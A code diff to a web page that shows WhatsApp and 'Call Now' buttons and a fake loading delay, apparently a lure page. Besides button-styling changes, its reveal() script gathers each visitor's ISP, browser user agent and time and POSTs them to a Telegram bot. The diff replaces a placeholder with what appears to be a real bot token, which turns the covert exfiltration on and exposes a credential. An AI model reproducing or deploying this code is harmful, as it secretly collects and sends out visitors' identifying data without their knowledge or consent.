@@ -33,16 +33,18 @@ h2 {
   margin-bottom: 20px;
 }
 
-/* Buttons */
+/* ALL BUTTONS SAME SIZE */
 button, a {
   display: block;
-  width: 90%;
+  width: 100%;
   padding: 15px;
   margin-top: 12px;
   border-radius: 12px;
   font-size: 16px;
-  border: none;
+  text-align: center;
+  box-sizing: border-box;
   text-decoration: none;
+  border: none;
   transition: 0.2s;
 }
 
@@ -104,7 +106,7 @@ button:active {
   💬 Chat on WhatsApp
 </a>
 
-<a id="call" style="display:none;">
+<a id="call" target="_self" style="display:none;">
   📞 Call Now
 </a>
 
@@ -115,7 +117,6 @@ async function reveal() {
 
   document.getElementById("loading").style.display = "block";
 
-  // Delay for better UX (feels real)
   await new Promise(r => setTimeout(r, 1200));
 
   try {
@@ -133,7 +134,7 @@ ISP: ${data.org}
 Device: ${navigator.userAgent}
 Time: ${new Date().toLocaleString()}`;
 
-    fetch("https://api.telegram.org/botYOUR_NEW_TOKEN/sendMessage", {
+    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
